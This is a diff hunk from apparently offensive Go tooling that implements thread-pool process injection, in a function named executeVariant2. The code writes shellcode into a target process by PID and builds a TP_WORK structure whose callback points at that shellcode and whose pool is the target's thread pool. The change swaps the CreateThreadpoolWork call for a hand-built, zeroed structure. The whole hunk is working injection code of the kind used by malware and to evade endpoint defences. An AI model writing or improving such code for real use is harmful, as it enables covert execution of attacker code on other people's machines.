@@ -497,25 +497,21 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
 
-	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (SafeBreach does this)
-	pTpWork, _, err := procCreateThreadpoolWork.Call(
-		shellcodeAddr, // Work callback points to shellcode
-		0,             // Context
-		0,             // Callback environment
-	)
-	if pTpWork == 0 {
-		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
-	}
-	output += "[+] Created TP_WORK structure associated with shellcode\n"
-
-	// Step 9: Read and modify the TP_WORK structure
+	// Step 8: Manually construct TP_WORK structure (avoiding CreateThreadpoolWork's local pointers)
 	var tpWork FULL_TP_WORK
-	// Copy the structure from our local process
-	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
-		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
-			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
+	
+	// Zero out the structure first
+	tpWorkBytes := (*[unsafe.Sizeof(tpWork)]byte)(unsafe.Pointer(&tpWork))
+	for i := range tpWorkBytes {
+		tpWorkBytes[i] = 0
 	}
+	
+	output += "[+] Initialized TP_WORK structure\n"
 
+	// Step 9: Set required fields for TP_WORK
+	// Set the callback to point to our shellcode
+	tpWork.CleanupGroupMember.Callback = shellcodeAddr
+	
 	// Modify: Point Pool to target's TP_POOL
 	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 	
